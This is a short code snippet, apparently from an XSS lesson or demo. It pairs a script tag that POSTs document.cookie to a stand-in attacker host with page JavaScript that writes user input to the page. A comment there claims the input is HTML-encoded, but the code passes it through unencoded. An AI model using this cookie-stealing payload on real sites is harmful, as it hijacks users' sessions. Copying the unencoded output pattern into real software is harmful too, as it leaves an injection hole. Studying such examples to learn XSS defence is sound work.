<script>
    fetch("theAttackersWebsite.com/victimData", {
    method: 'post',
    body: document.cookie,
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    }
})
</script>


window.onload = startFunction;

function startFunction() {
  var thisButton = document.getElementById("doIt");

  addEventListener("exe", function () {
    const string = document.getElementById("inputText").value;
    // Encode the string using the he package's encode() function
    var encodedStr = string;
    document.getElementById("output").textContent = encodedStr;
  });
}
